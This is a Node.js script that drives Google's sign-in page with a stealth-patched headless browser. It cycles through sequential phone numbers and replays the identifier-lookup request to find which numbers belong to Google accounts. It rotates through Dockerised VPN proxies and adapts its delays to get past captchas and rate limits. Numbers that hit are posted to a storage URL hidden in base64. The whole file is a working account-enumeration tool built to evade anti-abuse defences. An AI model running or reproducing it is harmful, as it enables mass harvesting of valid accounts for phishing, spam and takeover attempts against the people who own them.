const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const HttpsProxyAgent = require('https-proxy-agent')
const puppeteer = require('puppeteer-extra')
const {CookieJar} = require('tough-cookie')
const {execFile} = require('child_process')
const {promisify} = require('util')
const axios = require('axios')
const path = require('path')
const http = require('http')
const tls = require('tls')
const got = require('got')
const fs = require('fs')


let USER = process.argv.slice(2)[0]
let ENC_KEY = process.argv.slice(2)[1]
let ENC_IV = process.argv.slice(2)[2]

let mConfig = null
let page = null
let mPendingData = 0
let mProxyLimit = 0
let mCookiesJar = null
let mNumberTask = null
let mStart = Date.now()
let itFirstCheck = true
let isTaskRunning = false
let isFirstRequest = true
let pendingResolvers = []
let mProxyList = []
let mCapture = []
let mDelayControll = []

let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')


class Proxy {
    static CONFIG = {
        workDir: '.vpn-work',
        imageName: 'vpn-proxy',
        containerPrefix: 'openvpn-',
        connectTimeoutSec: 120,
        testTimeoutMs: 20000,
        testHost: 'api.ipify.org',
    }

    constructor() {
        fs.mkdirSync(path.resolve(Proxy.CONFIG.workDir), { recursive: true })
    }

    static sleep(ms) {
        return new Promise((r) => setTimeout(r, ms))
    }

    static async execFileP(cmd, args, opts = {}) {
        let fn = promisify(execFile)
        let { stdout } = await fn(cmd, args, { maxBuffer: 20 * 1024 * 1024, ...opts })
        return stdout
    }

    static async docker(args, opts = {}) {
        return await Proxy.execFileP('docker', args, opts)
    }

    static getIpViaProxy(port, timeoutMs) {
        return new Promise((resolve, reject) => {
            let host = Proxy.CONFIG.testHost
            let req = http.request({
                host: '127.0.0.1',
                port,
                method: 'CONNECT',
                path: `${host}:443`,
                timeout: timeoutMs,
            })

            req.on('timeout', () => req.destroy(new Error('proxy connect timeout')))
            req.on('error', reject)

            req.on('connect', (res, socket) => {
                if (res.statusCode !== 200) {
                    socket.destroy()
                    return reject(new Error(`CONNECT failed: HTTP ${res.statusCode}`))
                }
                let secure = tls.connect({ socket, servername: host }, () => {
                    secure.write(`GET / HTTP/1.0\r\nHost: ${host}\r\nConnection: close\r\n\r\n`)
                })
                let data = ''
                secure.setTimeout(timeoutMs, () => secure.destroy(new Error('TLS/response timeout')))
                secure.on('data', (c) => (data += c))
                secure.on('error', reject)
                secure.on('end', () => {
                    let cleanData = data.trim()
                    
                    let ipMatch = cleanData.match(/(?:\r\n\r\n|\n\n|^)([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|[0-9a-fA-F:]+)/)
                    let ip = ipMatch ? ipMatch[1].trim() : cleanData.replace(/[^0-9a-fA-F.:]/g, '').trim()

                    if (ip && (ip.includes('.') || ip.includes(':'))) {
                        resolve(ip)
                    } else {
                        reject(new Error('unexpected response: ' + cleanData.slice(0, 80)))
                    }
                })
            })

            req.end()
        })
    }

    async buildImage() {
        if (process.platform !== 'linux') {
            return
        }
        let dir = path.resolve(Proxy.CONFIG.workDir)
        fs.writeFileSync(
            path.join(dir, 'Dockerfile'),
            'FROM alpine:latest\nRUN apk add --no-cache openvpn curl iproute2 tinyproxy\n'
        )
        fs.writeFileSync(
            path.join(dir, 'tinyproxy.conf'),
            ['Port 8888', 'Listen 0.0.0.0', 'Timeout 600', 'Allow 0.0.0.0/0', 'DisableViaHeader Yes', 'LogLevel Info', 'MaxClients 50', ''].join('\n')
        )
        await Proxy.docker(['build', '-q', '-t', Proxy.CONFIG.imageName, dir])
    }

    async connect(ovpnContentString, port, index = 1) {
        let name = `${Proxy.CONFIG.containerPrefix}${index}`
        let startTime = Date.now()
        let result = {
            name,
            port,
            status: false,
            ip: null,
            time: 0,
            error: null,
        }

        if (process.platform !== 'linux') {
            return result
        }

        let tempOvpnPath = path.resolve(Proxy.CONFIG.workDir, `client-${index}.ovpn`)

        try {
            await Proxy.docker(['stop', name]).catch(() => {})
            await Proxy.docker(['rm', '-f', name]).catch(() => {})

            fs.writeFileSync(tempOvpnPath, ovpnContentString)

            await Proxy.docker([
                'run', '-d',
                '--name', name,
                '--privileged',
                '--cap-add=NET_ADMIN',
                '--device', '/dev/net/tun',
                '--dns', '8.8.8.8', '--dns', '1.1.1.1',
                '-p', `127.0.0.1:${port}:8888`,
                '-v', `${tempOvpnPath}:/etc/openvpn/client.ovpn:ro`,
                '-v', `${path.resolve(Proxy.CONFIG.workDir, 'tinyproxy.conf')}:/etc/tinyproxy/custom.conf:ro`,
                Proxy.CONFIG.imageName,
                'openvpn', '--config', '/etc/openvpn/client.ovpn',
            ])

            let deadline = Date.now() + Proxy.CONFIG.connectTimeoutSec * 1000
            let connected = false
            
            while (Date.now() < deadline) {
                let rawLogs = await Proxy.execFileP('docker', ['logs', name]).catch(() => '')
                
                if (rawLogs.includes('Initialization Sequence Completed')) {
                    connected = true
                    break
                }
                
                let running = (await Proxy.docker(['inspect', '-f', '{{.State.Running}}', name])).trim()
                if (running !== 'true') throw new Error('Container exited early')
                await Proxy.sleep(2000)
            }

            if (!connected) throw new Error('VPN connection timeout')

            await Proxy.docker(['exec', name, 'sh', '-c', 'printf "nameserver 1.1.1.1\\nnameserver 8.8.8.8\\n" > /etc/resolv.conf'])
            await Proxy.docker(['exec', '-d', name, 'tinyproxy', '-d', '-c', '/etc/tinyproxy/custom.conf'])
            await Proxy.sleep(2000)

            let proxyIp = await Proxy.getIpViaProxy(port, Proxy.CONFIG.testTimeoutMs)

            result.status = true
            result.ip = proxyIp
            result.time = Number(((Date.now() - startTime) / 1000).toFixed(2))
        } catch (error) {
            result.error = error.message
            result.time = Number(((Date.now() - startTime) / 1000).toFixed(2))
        }

        return result
    }

    async cleanup(name) {
        await Proxy.docker(['stop', name]).catch(() => {})
        await Proxy.docker(['rm', '-f', name]).catch(() => {})
    }
}

class AdaptiveDelay {
    constructor({minDelay = 1000, maxDelay = 3000, step = 200, incCooldown = 5000} = {}) {
        this.delay = minDelay
        this.minDelay = minDelay
        this.maxDelay = maxDelay
        this.step = step

        this.incCooldown = incCooldown

        this.lastIncTime = 0

        this.lastSignalCount = 0
        this.lastSignalTime = 0
    }

    update(signalCount) {
        if (signalCount == 0) {
            return this.delay
        }

        let now = Date.now()

        if (signalCount > this.lastSignalCount) {
            if (now - this.lastIncTime < this.incCooldown) {
                return this.delay
            }

            this.delay = Math.min(this.delay + this.step, this.maxDelay)
            this.lastIncTime = now
        }

        this.lastSignalCount = signalCount
        this.lastSignalTime = now

        return this.delay
    }
}

class SharedQueue {
    constructor(maxSize = 100) {
        this.queue = []
        this.waitingResolvers = []
        this.maxSize = maxSize
        this.count = 0
        this.isFinished = false
    }

    addData(data) {
        if (this.queue.length >= this.maxSize || this.isFinished) {
            return false
        }

        if (this.waitingResolvers.length > 0) {
            let resolve = this.waitingResolvers.shift()
            resolve(data)
        } else {
            this.queue.push(data)
        }
        return true
    }

    async getNumber() {
        if (this.isFinished || this.count >= this.maxSize) {
            return null
        }

        if (this.queue.length > 0) {
            this.count++
            return this.queue.shift()
        }

        return new Promise((resolve) => {
            let isResolved = false
            let checkInterval = null

            this.waitingResolvers.push((data) => {
                if (isResolved) return
                isResolved = true

                if (checkInterval) clearInterval(checkInterval)

                if (this.isFinished || this.count >= this.maxSize) {
                    resolve(null)
                } else {
                    this.count++
                    resolve(data)
                }
            })

            let maxWaitTime = 30000
            let intervalTime = 1000
            let elapsedTime = 0

            checkInterval = setInterval(() => {
                elapsedTime += intervalTime

                if (this.isFinished || this.count >= this.maxSize || elapsedTime >= maxWaitTime) {
                    if (!isResolved) {
                        isResolved = true
                        clearInterval(checkInterval)
                        
                        let index = this.waitingResolvers.indexOf(resolve)
                        if (index !== -1) {
                            this.waitingResolvers.splice(index, 1)
                        }
                        
                        resolve(null)
                    }
                }
            }, intervalTime)
        })
    }

    finish() {
        this.isFinished = true
        while (this.waitingResolvers.length > 0) {
            let resolve = this.waitingResolvers.shift()
            resolve(null)
        }
    }

    size() {
        return this.queue.length
    }

    getCount() {
        return this.count
    }
}

puppeteer.use(StealthPlugin())


let mProxyManager = new Proxy()


process.on('message', async (data) => {
    try {
        let json = (typeof data === 'string') ? JSON.parse(data) : data
        if (json.t == 1) {
            if (json.d) {
                if (json.d.t == 1) {
                    mConfig = json.d
                } else if (json.d.t == 2) {
                    let running = mConfig != null
                    process.send({ t: 3, s: 'controller_status', d: { t:2, r:running, u:json.u, s:USER, a:parseInt((Date.now()-mStart)/1000) } })
                }
            } else {
                mConfig = json
            }
        } else if (json.t == 2) {
            let running = mConfig != null
            process.send({ t: 3, s: 'controller_status', d: { t:2, r:running, u:json.u, s:USER, a:parseInt((Date.now()-mStart)/1000) } })
        }
    } catch (error) {}
})


startBrowser()


async function startBrowser() {
    await mProxyManager.buildImage()
    mCapture.push(0)
    mDelayControll.push(new AdaptiveDelay())

    let vpnConfig = await getVpnConfig(USER, ENC_KEY, ENC_IV)

    if(vpnConfig) {
        console.log('--------------------------------')
        
        for (let i = 0; i < vpnConfig.length; i++) {
            mCapture.push(0)
            mDelayControll.push(new AdaptiveDelay())
            let result = await mProxyManager.connect(vpnConfig[i].config, 8888+i, i+1)
            if (result.status) {
                mProxyLimit++
                let proxy = 'http://127.0.0.1:'+result.port
                mProxyList.push(proxy)
                console.log('Proxy Name: '+result.name)
                await checkProxyWithAxios(proxy)
                console.log('Load Time: '+result.time+'s')
                console.log('--------------------------------')
            } else {
                console.log('Proxy Name: '+result.name)
                console.log('Error Msg: '+result.error)
                console.log('Load Time: '+result.time+'s')
                console.log('--------------------------------')
            }
        }
    }

    try {
        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-notifications',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ]
        })

        page = (await browser.pages())[0]

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

        await page.setRequestInterception(true)

        page.on('request', async request => {
            try {
                let url = request.url()
                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e')) {
                    loginDataProcess(url, request.headers(), request.postData())
                    
                    let contentType = 'application/json; charset=utf-8'
                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

                    request.respond({
                        ok: true,
                        status: 200,
                        contentType,
                        body: output,
                    })
                } else {
                    request.continue()
                }
            } catch (error) {
                request.continue()
            }
        })

        console.log('Browser Load Success')

        await loadLoginPage()

        console.log('Page Load Success')
        
        await foundLoginNumber()
    } catch (error) {
        console.log('Browser Error: '+error)
    }
}

async function foundLoginNumber() {
    itFirstCheck = true 

    while (true) {
        if (mConfig) {
            mStart = Date.now()

            try {
                for (let i = 0; i < 3; i++) {
                    let target = mConfig.s
                    let worker = Math.min(mConfig.b, mProxyLimit)+1

                    mNumberTask = new SharedQueue(target)
                    
                    mPendingData = 0
                    isTaskRunning = true

                    for (let i = 0; i < worker; i++) {
                        let number = mConfig.n+i
                        await setLoginRequest(number.toString())
                    }

                    await waitForFirstStepFinish(worker)
                    seartNextNumberToken(mConfig.n, worker, target)

                    mCookiesJar = await getCookiesJar(page)

                    let result = await workerStart(worker, target, itFirstCheck)
                    
                    isTaskRunning = false
                    await pendingTaskCancel()

                    if (itFirstCheck && result.b) {
                        console.log('Request Captcha Found')
                        await loadLoginPage()
                        await clearDelay()
                        itFirstCheck = true
                        continue
                    } else if (result.c > 20) {
                        await loadLoginPage()
                        console.log('Reload Page Success')
                    }

                    process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:result.f, r:result.r, c:result.c, o:result.o } })
                    itFirstCheck = false
                    break
                }
            } catch (error) {}

            mConfig = null
        } else {
            await delay(1000)
        }
    }
}

async function workerStart(workerSize, target, firstCheck) {
    let workers = []
    let result = {
        b: false,
        f: 0,
        r: 0,
        c: 0,
        o: 0
    }

    let capture = {}
    let timeoutMs = target * 3000

    let globalConsecutiveStatus = 0
    let shouldStop = false

    for (let i = 0; i < workerSize; i++) {
        let workerId = i

        let workerPromise = (async () => {
            while (true) {
                if (shouldStop) {
                    break
                }

                let task = await mNumberTask.getNumber()

                if (task === null || shouldStop) {
                    break
                }

                let status = await sendRequest(task, workerId)

                if (shouldStop) {
                    break
                }

                if (status == 1) {
                    result.f++
                    firstCheck = false
                    globalConsecutiveStatus = 0
                    if (mConfig) await saveNumber(mConfig.u, mConfig.k, task.number)
                } else if (status == 2) {
                    result.r++
                    firstCheck = false
                    globalConsecutiveStatus = 0
                } else if (status == 5) {
                    result.c++
                    mCapture[workerId] = (mCapture[workerId] || 0) + 1
                    let workerKey = workerId.toString()
                    capture[workerKey] = (capture[workerKey] || 0) + 1
                } else if (status == 3 || status == 0) {
                    result.o++
                }

                if (firstCheck && (status == 5 || status == 3 || status == 0)) {
                    globalConsecutiveStatus++
                    
                    if (globalConsecutiveStatus >= 10) {
                        shouldStop = true
                        result.b = true
                        mNumberTask.finish()
                        break
                    }
                }

                if (shouldStop) {
                    break
                }

                await delay(mDelayControll[workerId].update((mCapture[workerId] || 0)))
            }
        })()

        workers.push(workerPromise)
    }

    let timeoutId

    let timeoutPromise = new Promise((resolve) => {
        timeoutId = setTimeout(() => {
            shouldStop = true
            mNumberTask.finish()
            resolve(result)
        }, timeoutMs)
    })

    try {
        await Promise.race([
            Promise.all(workers),
            timeoutPromise
        ])
    } finally {
        if (timeoutId) clearTimeout(timeoutId)
    }

    mNumberTask.finish()

    if (result.c > 0 && !result.b) {
        console.log('Capture:', capture)
    }

    return result
}

async function waitForFirstStepFinish(target) {
    if (mPendingData >= target) return

    return new Promise((resolve) => {
        let waiter = {
            target: target,
            resolve: resolve,
            timerId: null
        }

        waiter.timerId = setTimeout(() => {
            let index = pendingResolvers.indexOf(waiter)
            if (index !== -1) {
                pendingResolvers.splice(index, 1)
                resolve()
            }
        }, Math.max(target * 400, 5000))

        pendingResolvers.push(waiter)
    })
}

async function pendingTaskCancel() {
    try {
        if (typeof pendingResolvers !== 'undefined' && pendingResolvers.length > 0) {
            pendingResolvers.forEach(waiter => {
                if (waiter.timerId) {
                    clearTimeout(waiter.timerId)
                }
                waiter.resolve()
            })
            pendingResolvers = []
        }
    } catch (error) {}
}

async function seartNextNumberToken(number, next, target) {
    let currentNextNum = number + next
    let processedCount = next

    while (processedCount < target && isTaskRunning) {
        mPendingData = 0

        for (let i = 0; i < next; i++) {
            if (processedCount >= target || !isTaskRunning) break
            let targetNumber = currentNextNum + i
            await setLoginRequest(targetNumber.toString())
            processedCount++
        }

        currentNextNum += next
        await waitForFirstStepFinish(next)
    }
}

async function setLoginRequest(number) {
    try {
        page.evaluate((number) => {
            document.querySelector('input#identifierId').value = number
            document.querySelector('#identifierNext').click()
        }, '+'+number)

        if (isFirstRequest) {
            for (let i = 0; i < 20; i++) {
                if(mPendingData > 0) {
                    break
                }
                await delay(250)
            }
            isFirstRequest = false
        }
    } catch (error) {}
}

async function loginDataProcess(url, headers, postData) {
    try {
        let data = JSON.parse(JSON.parse(Object.fromEntries(new URLSearchParams(postData))['f.req'])[0][0][1])

        let number = data[1].replace('+', '')

        mPendingData++
        mNumberTask.addData({ number, url, headers, postData })

        if (pendingResolvers.length > 0) {
            pendingResolvers = pendingResolvers.filter(waiter => {
                if (mPendingData >= waiter.target) {
                    if (waiter.timerId) {
                        clearTimeout(waiter.timerId)
                    }
                    waiter.resolve()
                    return false
                }
                return true
            })
        }
    } catch (error) {}
}

async function sendRequest(task, id) {
    try {
        let agent = undefined

        if (id > 0) {
            let proxy = mProxyList[id-1]

            if (proxy) {
                agent = {
                    http: new HttpsProxyAgent(proxy),
                    https: new HttpsProxyAgent(proxy)
                }
            }
        }
        
        let headers = {
            ...task.headers,
            'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            'host': 'accounts.google.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'no-cors',
        }        

        let options = {
            cookieJar: mCookiesJar,
            method: 'POST',
            body: task.postData,
            headers: headers,
            agent: agent,
            responseType: 'buffer',
            maxRedirects: 15,
            throwHttpErrors: false,
            ignoreInvalidCookies: true,
            followRedirect: false,
            timeout: {
                request: 10000
            }
        }

        for (let i = 0; i < 2; i++) {
            try {
                let response = await got(task.url, options)
        
                let data = response.body.toString()

                let json = extractArrays(data)[0][0]

                if (json[1] == 'MI613e') {
                    let value = JSON.parse(json[2])
                    
                    if (value[21]) {
                        let values = JSON.stringify(value[21])
                        if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
                            return 1
                        } else if (values.includes('/v3/signin/challenge/recaptcha')) {
                            return 2
                        } else {
                            return 3
                        }
                    } else if (value[18] && value[18][0]) {
                        return 5
                    } else {
                        return 4
                    }
                }
            } catch (error) {
                await delay(1000)
            }
        }
    } catch (error) {}

    return 0
}

async function loadLoginPage() {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
            await delay(500)
            await page.evaluate(() => {
                let root = document.querySelector('div[class="kPY6ve"]')
                if (root) {
                    root.remove()
                }
                root = document.querySelector('div[class="Ih3FE"]')
                if (root) {
                    root.remove()
                }
            })

            isFirstRequest = true
            break
        } catch (error) {}
    }
}

async function getVpnConfig(user, key, iv) {
    try {
        let response = await axios.post('https://proxy.raiyanbd.com/get-vpn', { user, key, iv })

        if (response.data.success) {
            return Object.entries(response.data.data).map(([ip, value]) => ({
                ip,
                ...value
            }))
        }
    } catch (error) {}

    return null
}

async function updateVpnIp(user, ip, key, iv) {
    try {
        let response = await axios.post('https://proxy.raiyanbd.com/update-ip', { user, ip, key, iv })

        if (response.data.success) {
            return response.data.data
        }
    } catch (error) {}

    return null
}

async function clearDelay() {
    for (let i = 0; i < mDelayControll.length; i++) {
        mDelayControll[i] = new AdaptiveDelay()
        mCapture[i] = 0
    }
}

async function checkProxyWithAxios(proxyUrl) {
    for (let i = 0; i < 3; i++) {
        try {
            let agent = new HttpsProxyAgent(proxyUrl)

            let response = await axios.get('https://api.ipify.org?format=json', {
                httpAgent: agent,
                httpsAgent: agent,
                timeout: 10000
            })
            
            console.log('IP Address:', response.data.ip)
            break
        } catch (error) {
            console.log('IP Error:', error.message)
        }
    }
}

function extractArrays(raw) {
    raw = raw.replace(/^\)\]\}'\s*/g, '')

    let lines = raw.split('\n')

    let arrays = []

    for (let i = 0; i < lines.length; i++) {
        let line = lines[i].trim()

        if (line.startsWith('[')) {
            try {
                arrays.push(JSON.parse(line))
            } catch {}
        }
    }

    return arrays
}

async function saveNumber(user, key, number) {
    try {
        await fetch(STORAGE+encodeURIComponent('number/'+user+'/'+key+'/'+number), {
            method: 'POST',
            body: ''
        })
    } catch (error) {}
}

async function getCookiesJar(page) {
    let puppeteerCookies = await page.cookies()

    let cookies = puppeteerCookies.map(cookie => ({
        creation: new Date().toISOString(),
        domain: cookie.domain.replace(/^\./, ''),
        expires: cookie.expires === -1 ? Infinity : new Date(cookie.expires * 1000).toISOString(),
        hostOnly: !cookie.domain.startsWith('.'),
        httpOnly: cookie.httpOnly,
        key: cookie.name,
        lastAccessed: new Date().toISOString(),
        path: cookie.path,
        secure: cookie.secure,
        value: cookie.value
    }))

    return CookieJar.deserializeSync({
        cookies,
        rejectPublicSuffixes: true,
        storeType: 'MemoryCookieStore',
        version: 'tough-cookie@2.0.0'
    })
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('utf-8')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
